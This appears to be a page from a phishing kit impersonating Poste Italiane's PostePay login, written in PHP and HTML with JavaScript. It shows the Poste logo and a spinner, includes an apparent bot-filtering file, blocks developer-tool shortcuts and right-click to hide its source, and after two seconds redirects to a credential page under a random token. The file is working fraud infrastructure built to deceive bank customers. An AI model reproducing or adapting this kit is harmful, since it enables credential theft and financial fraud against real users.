<?php
include_once '../../../BOTS/INC/APP.php';
?>
<script>

	document.onkeydown = function(e) {
	  if(event.keyCode == 123) {
	     return false;
	  }
	  if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
	     return false;
	  }
	  if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
	     return false;
	  }
	  if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
	     return false;
	  }
	}


	
	document.addEventListener('contextmenu', function(e) {
	  e.preventDefault();
	});

</script>
   	<script>
	function makeid()
							  {
								  var text = "";
								  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

								  for( var i=0; i < 110; i++ )
									  text += possible.charAt(Math.floor(Math.random() * possible.length));

								  return text;
							  }
							  
 function Redirect() 
    {  
        window.location="./index.php?it="+makeid(); 
    } 
    document.write(""); 
    setTimeout('Redirect()', 2000);
</script> 
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<link rel="icon" href="http://localhost/-/POSTEPAY/IT" type="image/x-icon">
<title>Accedi o Registrati</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="https://securelogin.poste.it/favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="/app_icon_oficina_128x128.png" rel="apple-touch-icon" sizes="128x128">
<link href="./loading_files/scamti.css" rel="stylesheet">
<link href="./loading_files/MOBILE.css" rel="stylesheet">
</head>
<body>
<div id="LayoutGrid1">
<div class="col-1">
<div id="wb_LayoutGrid2">
<div id="LayoutGrid2">
<div class="row">
<div class="col-1">
<div id="wb_Image" style="">
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br><br><br><br><br><br><br><br><br><br><br><br><br>
<center><IMG border=0 hspace=0 alt="" src="./IMG/logo-poste-italiane-blocco-giallo@2x.png">
<br>
<br>
<br>
<img src="./IMG/spinner_giallo.gif" width=35 align=baseline height=35>
</div>
<div id="wb_Text2">
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>

</body></html>